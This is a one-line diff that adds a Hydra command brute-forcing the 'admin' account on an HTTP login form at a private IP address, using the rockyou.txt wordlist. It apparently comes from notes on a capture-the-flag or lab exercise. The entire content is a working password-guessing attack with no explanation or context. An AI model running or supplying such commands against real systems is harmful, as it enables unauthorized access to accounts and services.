@@ -1,0 +1,1 @@
+hydra -l admin -P /root/Desktop/rockyou.txt 10.10.153.158 http-post-form "/login:username=^USER^&password=^PASS^:F=incorrect"
